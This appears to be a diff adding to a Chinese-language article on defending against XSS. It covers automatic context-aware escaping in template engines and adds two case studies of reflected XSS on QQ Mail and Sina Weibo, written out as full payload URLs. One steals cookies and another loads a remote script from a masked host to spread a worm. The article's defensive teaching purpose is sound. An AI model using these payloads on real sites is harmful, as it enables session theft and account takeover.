@@ -54,6 +54,8 @@
 `http://xxx/?redirect_to=%20javascript:alert('XSS')`
 这样的变种.
 
+除了href还可以利用onerror等属性
+
 所以一般用的是白名单的方式:
 ```
 // 根据项目情况进行过滤，禁止掉 "javascript:" 链接、非法 scheme 等
@@ -376,4 +378,90 @@ http://xxx/search?keyword=jaVasCript%3A%2F*-%2F*%60%2F*%60%2F*%27%2F*%22%2F**%2F
 
 **主动检测和发现**
 可使用 XSS 攻击字符串和自动扫描工具寻找潜在的 XSS 漏洞。
+
+# XSS 攻击案例
+## QQ 邮箱 m.exmail.qq.com 域名反射型 XSS 漏洞
+攻击者发现 `http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&domain=bbbb` 这个 URL 的参数 uin、domain 未经转义直接输出到 HTML 中。
+
+于是攻击者构建出一个 URL，并引导用户去点击：
+`http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&domain=bbbb%26quot%3B%3Breturn+false%3B%26quot%3B%26lt%3B%2Fscript%26gt%3B%26lt%3Bscript%26gt%3Balert(document.cookie)%26lt%3B%2Fscript%26gt%3B`
+
+用户点击这个 URL 时，服务端取出 URL 参数，拼接到 HTML 响应中：
+```
+<script>
+getTop().location.href="/cgi-bin/loginpage?autologin=n&errtype=1&verify=&clientuin=aaa"+"&t="+"&d=bbbb";return false;</script><script>alert(document.cookie)</script>"+"...
+```
+
+浏览器接收到响应后就会执行 alert(document.cookie)，攻击者通过 JavaScript 即可窃取当前用户在 QQ 邮箱域名下的 Cookie ，进而危害数据安全。
+
+## 新浪微博名人堂反射型 XSS 漏洞
+攻击者发现 `http://weibo.com/pub/star/g/xyyyd` 这个 URL 的内容未经过滤直接输出到 HTML 中。
+
+于是攻击者构建出一个 URL，然后诱导用户去点击：
+
+`http://weibo.com/pub/star/g/xyyyd"><script src=//xxxx.cn/image/t.js></script>`
+
+用户点击这个 URL 时，服务端取出请求 URL，拼接到 HTML 响应中：
+
+```
+<li><a href="http://weibo.com/pub/star/g/xyyyd"><script src=//xxxx.cn/image/t.js></script>">按分类检索</a></li>
+```
+浏览器接收到响应后就会加载执行恶意脚本 //xxxx.cn/image/t.js，在恶意脚本中利用用户的登录状态进行关注、发微博、发私信等操作，发出的微博和私信可再带上攻击 URL，诱导更多人点击，不断放大攻击范围。这种窃用受害者身份发布恶意内容，层层放大攻击范围的方式，被称为“XSS 蠕虫”。
+
+
+# Automatic Context-Aware Escaping
+
+- 合适的 HTML 转义可以有效避免 XSS 漏洞。
+- 完善的转义库需要针对上下文制定多种规则，例如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等等。
+- 业务 RD 需要根据每个插入点所处的上下文，选取不同的转义规则。
+
+通常，转义库是不能判断插入点上下文的（Not Context-Aware），实施转义规则的责任就落到了业务 RD 身上，需要每个业务 RD 都充分理解 XSS 的各种情况，并且需要保证每一个插入点使用了正确的转义规则。
+
+这种机制工作量大，全靠人工保证，很容易造成 XSS 漏洞，安全人员也很难发现隐患。
+
+2009年，Google 提出了一个概念叫做：[Automatic Context-Aware Escaping](https://security.googleblog.com/2009/03/reducing-xss-by-way-of-automatic.html)。
+
+所谓 Context-Aware，就是说模板引擎在解析模板字符串的时候，就解析模板语法，分析出每个插入点所处的上下文，据此自动选用不同的转义规则。这样就减轻了业务 RD 的工作负担，也减少了人为带来的疏漏。
+
+在一个支持 Automatic Context-Aware Escaping 的模板引擎里，业务 RD 可以这样定义模板，而无需手动实施转义规则：
+```
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>{{.title}}</title>
+  </head>
+  <body>
+    <a href="{{.url}}">{{.content}}</a>
+  </body>
+</html>
+```
+
+模板引擎经过解析后，得知三个插入点所处的上下文，自动选用相应的转义规则：
+```
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>{{.title | htmlescaper}}</title>
+  </head>
+  <body>
+    <a href="{{.url | urlescaper | attrescaper}}">{{.content | htmlescaper}}</a>
+  </body>
+</html>
+```
+
+目前已经支持 Automatic Context-Aware Escaping 的模板引擎有：
+[go html/template](https://golang.org/pkg/html/template/)
+[Google Closure Templates](https://developers.google.com/closure/templates/docs/security)
+
+# XSS 攻击小游戏
+[alert(1) to win](https://alf.nu/alert1)
+[prompt(1) to win](http://prompt.ml/)
+[XSS game](https://xss-game.appspot.com/)
+
+相关阅读
+[XSS 绕过常用语句](https://damit5.com/2017/10/15/XSS-%E7%BB%95%E8%BF%87%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5/)
+[XSS注入-简单过滤绕过方法](https://blog.csdn.net/qq_25899635/article/details/90675105)
+[【前端安全】Javascript 防 http 劫持 与 XSS](https://www.jianshu.com/p/0451dee34496)
+
+
 
